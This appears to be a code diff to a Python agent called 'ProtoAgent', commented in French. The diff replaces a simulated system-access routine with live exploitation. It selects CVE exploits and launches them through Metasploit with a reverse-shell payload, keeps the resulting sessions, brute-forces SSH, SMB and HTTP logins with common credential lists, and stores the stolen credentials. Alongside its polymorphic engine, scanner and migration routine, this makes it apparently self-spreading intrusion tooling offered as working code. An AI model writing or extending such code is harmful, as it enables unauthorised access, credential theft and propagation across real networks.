@@ -14,6 +14,9 @@ from utils.cve_database import CVEDatabase
 from proto_agent.polymorphic import PolymorphicEngine
 from proto_agent.recon.nmap_scanner import NmapScanner
 from proto_agent.recon.fingerprint import Fingerprinter
+from proto_agent.exploitation.msf_client import MSFClient
+from proto_agent.exploitation.bruteforce import BruteforceEngine
+from proto_agent.exploitation.exploit_selector import ExploitSelector
 
 
 class ProtoAgent:
@@ -34,6 +37,11 @@ class ProtoAgent:
         self.scanner = NmapScanner()
         self.fingerprinter = Fingerprinter()
         self.cve_db = CVEDatabase()
+        
+        # Modules d'exploitation RÉELS
+        self.msf = MSFClient(password=config.get('msf_password', 'msf'))
+        self.bruteforce = BruteforceEngine(delay=0.5)
+        self.exploit_selector = ExploitSelector()
         
         # Connaissances accumulées (structure améliorée)
         self.knowledge = {
@@ -241,32 +249,153 @@ class ProtoAgent:
         return target
     
     async def _attempt_access(self, target: Dict) -> bool:
-        """Tente d'accéder à un système"""
+        """Tente d'accéder à un système - EXPLOITATION RÉELLE"""
         print(f"[{self.node_id}] Attempting access to {target['id']}")
         
-        # Simulation d'exploitation
-        # Dans un vrai système: test vulns, brute force, etc.
-        success_rate = 0.3  # 30% base
+        target_ip = target.get('ip')
         
-        # Augmente avec l'expérience
-        success_rate += min(len(self.travel_history) * 0.05, 0.4)
+        # Récupérer les vulnérabilités et services de ce système
+        if target_ip not in self.knowledge['systems']:
+            print(f"[{self.node_id}] No intelligence on {target_ip}, skipping")
+            return False
         
-        success = random.random() < success_rate
+        system_info = self.knowledge['systems'][target_ip]
+        vulnerabilities = system_info.get('vulnerabilities', [])
+        services = system_info.get('ports', [])
         
-        if success:
-            print(f"[{self.node_id}] Successfully accessed {target['id']}")
+        # 1. EXPLOITATION PAR CVE (prioritaire)
+        if vulnerabilities:
+            print(f"[{self.node_id}] Attempting CVE exploitation ({len(vulnerabilities)} vulns)")
             
-            # Enregistrement découverte
-            self.discoveries.append({
-                'type': 'successful_access',
-                'target': target['id'],
-                'timestamp': time.time(),
-                'method': 'simulated'
-            })
-        else:
-            print(f"[{self.node_id}] Failed to access {target['id']}")
+            # Obtenir chaîne d'exploitation
+            target_data = {
+                'ip': target_ip,
+                'vulnerabilities': vulnerabilities,
+                'services': services
+            }
+            
+            exploit_chain = self.exploit_selector.get_exploit_chain(target_data)
+            
+            if exploit_chain:
+                # Tenter premier exploit de la chaîne
+                first_exploit = exploit_chain[0]
+                
+                if await self._attempt_exploitation(target_ip, first_exploit):
+                    print(f"[{self.node_id}] ✓ Exploitation successful via {first_exploit['exploit']}")
+                    
+                    self.discoveries.append({
+                        'type': 'successful_access',
+                        'target': target['id'],
+                        'target_ip': target_ip,
+                        'timestamp': time.time(),
+                        'method': 'exploit',
+                        'exploit_used': first_exploit['exploit'],
+                        'cve': first_exploit.get('cve')
+                    })
+                    
+                    return True
         
-        return success
+        # 2. BRUTEFORCE (fallback)
+        print(f"[{self.node_id}] Attempting bruteforce...")
+        
+        bruteforce_targets = self.exploit_selector.suggest_bruteforce_targets(services)
+        
+        for bf_target in bruteforce_targets[:2]:  # Top 2
+            if await self._attempt_bruteforce(target_ip, bf_target):
+                print(f"[{self.node_id}] ✓ Bruteforce successful on {bf_target['service']}")
+                
+                self.discoveries.append({
+                    'type': 'successful_access',
+                    'target': target['id'],
+                    'target_ip': target_ip,
+                    'timestamp': time.time(),
+                    'method': 'bruteforce',
+                    'service': bf_target['service']
+                })
+                
+                return True
+        
+        print(f"[{self.node_id}] ✗ All access attempts failed")
+        return False
+    
+    async def _attempt_exploitation(self, target_ip: str, exploit_info: Dict) -> bool:
+        """Tente exploitation via Metasploit"""
+        try:
+            # Connexion MSF si pas déjà connecté
+            if not self.msf.connected:
+                if not await asyncio.to_thread(self.msf.connect):
+                    return False
+            
+            # Exécution exploit
+            result = await asyncio.to_thread(
+                self.msf.run_exploit,
+                exploit_info['exploit'],
+                exploit_info['options'],
+                exploit_info.get('payload', 'generic/shell_reverse_tcp')
+            )
+            
+            if result.get('success'):
+                # Stocker session info
+                session_id = result['session_id']
+                
+                if target_ip not in self.knowledge['systems']:
+                    self.knowledge['systems'][target_ip] = {}
+                
+                self.knowledge['systems'][target_ip]['msf_session'] = session_id
+                
+                return True
+        
+        except Exception as e:
+            print(f"[{self.node_id}] Exploitation failed: {e}")
+        
+        return False
+    
+    async def _attempt_bruteforce(self, target_ip: str, bf_target: Dict) -> bool:
+        """Tente bruteforce sur service"""
+        service = bf_target['service']
+        port = bf_target['port']
+        
+        # Listes de credentials
+        usernames = BruteforceEngine.get_common_usernames()[:10]  # Top 10
+        passwords = BruteforceEngine.get_common_passwords()[:10]  # Top 10
+        
+        try:
+            if service == 'ssh':
+                result = await asyncio.to_thread(
+                    self.bruteforce.ssh_bruteforce,
+                    target_ip, usernames, passwords, port
+                )
+            elif service == 'smb':
+                result = await asyncio.to_thread(
+                    self.bruteforce.smb_bruteforce,
+                    target_ip, usernames, passwords
+                )
+            elif service == 'http':
+                url = f"http://{target_ip}:{port}"
+                result = await asyncio.to_thread(
+                    self.bruteforce.http_basic_bruteforce,
+                    url, usernames, passwords
+                )
+            else:
+                return False
+            
+            if result.get('success'):
+                # Stocker credentials
+                self.knowledge['credentials'].append({
+                    'ip': target_ip,
+                    'service': service,
+                    'port': port,
+                    'username': result['username'],
+                    'password': result['password'],
+                    'discovered_at': time.time()
+                })
+                
+                return True
+        
+        except Exception as e:
+            print(f"[{self.node_id}] Bruteforce failed: {e}")
+        
+        return False
     
     async def _migrate_to(self, target: Dict):
         """Migre vers un nouveau système"""
